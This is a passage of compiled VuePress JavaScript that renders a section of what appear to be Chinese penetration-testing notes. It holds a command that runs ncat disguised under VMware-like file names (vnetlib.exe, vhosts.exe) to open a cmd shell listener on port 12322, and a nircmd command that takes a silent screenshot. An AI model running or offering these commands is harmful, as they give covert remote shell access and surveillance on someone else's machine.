\"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"8\"}},[a(\"li\",[s._v(\"其它\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"丢失 msvcr120.dll\\n\\nvnetlib.exe -c vnetlib.ini \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"&\")]),s._v(\" vhosts.exe --allow  \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -l \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"12322\")]),s._v(\" -c cmd\\n\\n自行从nmap官网下载ncat编译，不依赖其他dll文件\\n\\nnircmd 功能强大的软件\\n\\nnircmd.exe savescreenshot screenhotfilename.png\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),a(\"br\")])])])}),[],!1,null,null,null);a.default=e.exports}}]);","extractedComments":[]}